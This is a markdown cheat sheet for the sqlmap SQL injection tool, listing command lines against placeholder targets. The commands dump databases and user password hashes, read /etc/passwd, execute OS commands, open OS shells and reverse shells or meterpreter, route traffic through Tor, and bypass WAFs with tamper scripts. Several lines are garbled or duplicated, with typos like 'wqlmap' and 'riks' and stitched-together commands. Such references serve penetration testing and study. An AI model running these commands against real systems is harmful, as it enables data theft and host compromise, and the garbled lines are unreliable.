# sqlmap 

## Simple Usage

If you don’t know anything about the target site then use the normal command first, 
Observe if the SQLMap found something juicy for you

```sh
sqlmap -u “https://target_site.com/page/”
```

### Automatic GET request parameter
```sh
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”
```
### Specify the GET request parameters to Exploit

You can specify on which parameter you want to check or exploit the sql injection using just “-p” flag.
```sh
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2” -p p1
```

### Use POST requests (Test All parameters)
```sh
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"
```

### SQLMap Request file as input

You can specify a request file containing the HTTP request, You can get it quickly from BurpSuite.

```sh
sqlmap -r request.txt
```

### Here you can specify the targeted parameter or sqlmap will recognize and will test for all the parameters found.

!! info "Specify Custom Position in HTTP request file - You can use the asterisk sign(*) to specify which parameter to attack or which place of the request to be attacked. You can specify or mark any part of the request by this method."

### Use Authenticated Session With Cookie
```sh
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"
```
### Use Authenticated Session with Auth Headers
```sh
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"
```
### Basic Authentication
```sh
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
```
### Use Previously created Session as SQLmap input (-s)

If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.)

```sh
sqlmap -u “https://target_site.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs
```
## Post Exploitation Commands

If the SQL injection vulnerability is observed positive then you can use the following commands to Exploit the SQL injection vulnerability.

### List the Databases
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --dbs
```
### List Tables of Database TARGET_DB
```sh
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables
```
### List Columns of Table TARGET_TABLE of Database TARGET_DB
```sh
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns
```
### Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB
```sh
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump
```
### Fully Dump Table TARGET_TABLE of Database TARGET_DB

```sh
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump
```
### Dump full Database

```sh
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump
```

### Custom SQL query

```sh
sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"
```
### Get OS Shell
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --os-shell
```
### Get SQL shell
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell
```
## SQLMap Proxy

## Proxy through Burpsuite
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --proxy="http://127.0.0.1:8080/"
```
## Use Tor Socks5 proxy
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --tor --tor-type=SOCKS5 --check
```
## Extra

### Specify The Database Type
```sh
sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql
```

You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc.

## Attack Techniques

`–technique` Specify a letter or letters of BEUSTQ to control the exploit attempts:

```
B: `Boolean-based blind`

E: `Error-based`

U: `Union query-based`

S: `Stacked queries`

T: `Time-based blind`

Q: `Inline queries`
```

```sh
sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ
```

### Basic

	sqlmap -u <url> -u "<URL>"
	
	sqlmap -u <url> -p "<PARAM TO TEST>"
	
	sqlmap -u <url> --user-agent=SQLMAP
	
	sqlmap -u <url> --random-agent
	
	sqlmap -u <url> --threads=10
	
### Level 3 is max

	wqlmap -u <url> --risk=3

### Level 5 is max

	sqlmap -u <url> --level=5

	sqlmap -u <url> --dbms="<KNOWN DB TECH>"

	sqlmap -u <url> --os="<OS>"

### Use only techniques UNION and BLIND in that order (default "BEUSTQ")

    sqlmap -u <url> --technique="UB"

### Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers

    sqlmap -u <url> --batch

### HTTP authentication type (Basic, Digest, NTLM or PKI)

    sqlmap -u <url> --auth-type="<AUTH>"

### HTTP authentication credentials (name:password)

    sqlmap -u <url> --auth-cred="<AUTH>"

    sqlmap -u <url> --proxy=http://127.0.0.1:8080

### Help sqlmap identify union SQLi techniques with a weird union char

    sqlmap -u <url> --union-char "GsFRts2"

### Get current user

    sqlmap -u <url> --current-user

### Check if current user is Admin

    sqlmap -u <url> --is-dba

### Get hostname

    sqlmap -u <url> --hostname

### Get usernames od DB

    sqlmap -u <url> --users

### Get passwords of users in DB

    sqlmap -u <url> --passwords

### Get privileges

    sqlmap -u <url> --privileges

### Retrieve everything

    sqlmap -u <url> --all

### Dump DBMS database table entries

    sqlmap -u <url> --dump

### Names of the available databases

    sqlmap -u <url> --dbs

### Tables of a database ( -D <DB NAME> )

    sqlmap -u <url> --tables

### Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )

    sqlmap -u <url> --columns

### Dump column

    sqlmap -u <url> -D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME>

    sqlmap -u <url> sqlmap  -u "http://example.com" --cookie "mycookies=*"

    sqlmap -u <url> --string="string_showed_when_TRUE"

    sqlmap -u <url> --file-read=/etc/passwd

    sqlmap -u <url> --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers

    sqlmap -u <url> --crawl = how deep you want to crawl a site

    sqlmap -u <url> --forms = Parse and test forms

    sqlmap -u <url> python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "

    sqlmap -u <url> python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "

    sqlmap -u <url> --tamper=name_of_the_tamper


### Get Injection Request

    sqlmap -u "http://example.com/?id=*" -p id

### Post injection

    sqlmap -u "http://example.com/" --data="login=blah&password=wuzi"

### Inside cookie

    sqlmap  -u "http://example.com" --cookie "mycookies=*"
    sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
    sqlmap -u "http://example.com" --headers="referer:*"

### PUT Method

    sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

### Eval

    sqlmap -u https://foo --eval "session"

### Exec command

    sqlmap -u "http://example.com/?id=1" -p id --os-cmd whoami

### Simple Shell

    sqlmap -u "http://example.com/?id=1" -p id --os-shell

### Dropping a reverse-shell / meterpreter

    sqlmap -u "http://example.com/?id=1" -p id --os-pwn

### Read file

   sqlmap -u https://foo?id=1 --file-read=foo.txt

### Crawl a website with SQLmap and auto-exploit

    sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
    sqlmap --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
    sqlmap --crawl = how deep you want to crawl a site
    sqlmap --forms = Parse and test forms

#### Get the SQL payload execution with a GET to a url

    sqlmap -r login.txt -p username --second-url "http://foo/details.php"

### Get the SQL payload execution sending a custom request from a file

    sqlmap -r login.txt -p username --second-req details.txt

### Specify the Injection Techniques

```
You can specify the difficulty levels using two flags,

Option: --risk

–level = LEVEL     Level of tests to perform (1-5, default 1)
–risk=RISK         Risk of tests to perform (0-3, default 1)```sh
```

```sh
sqlmap -u “https://target_site.com/page?p1=value1” --risk=3 --level=5
```
### This option requires an argument that specifies the risk of tests to perform. There are three risk values.

```
–riks=1: 1 is the default value which is for the majority of SQL injection points.
–riks=2: Adds to the default level the tests for heavy query time-based SQL injections
–riks=3: Value 3 adds also OR-based SQL injection tests.
```

When the value of --level is >= 2 it tests also HTTP Cookie header values. When this value is >= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections.

Use Default Options for the process
Use –batch flag to use all the default options or used for non-interactive sessions. (By specifying –batch flag, sqlmap will not ask you for the (Y/N) choice rather then it will smartly choose according to the needs.)

```sh
sqlmap -u “https://target_site.com/page?p1=value1” --batch
```

### Force SQLmap to use SSL or TLS for its requests.

`–force-ssl flag` - Error: Can’t establish SSL connection

If you getting the following error during testing then you can use the flag `–force-ssl` to force SQLMap to use SSL or TLS.

## Tamper Scripts

You can use the tamper scripts to bypass WAF or to modify the payload. You can use multiple tampering scripts at once using `–tamper` flag.

```sh
sqlmap -u “https://target_site.com/page?p1=value1” --tamper=charencode
```

### For General Perpose Usecase:
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### MSSQL:
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dsash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### MySQL:

```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
OR You can create your own Custom Tamper script to overcome the issue of some type of Encrypted payloads like AES, DES, Hashing, etc.
```
